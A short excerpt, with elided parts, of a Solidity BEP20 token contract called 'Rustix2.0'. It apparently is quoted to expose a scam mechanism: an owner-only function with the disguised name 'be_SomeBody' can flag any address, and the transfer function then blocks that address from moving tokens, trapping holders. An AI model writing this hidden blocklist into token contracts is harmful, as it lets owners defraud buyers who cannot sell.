...
contract RustixTwo is IBEP20, Auth {
    ...
    string constant _name = "Rustix2.0";
    string constant _symbol = "Rustix2.0"; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!someBody[sender], "Address is excluded.");
    ...
    function be_SomeBody(address _address, bool _value) public onlyOwner {
        someBody[_address] = _value;
    }
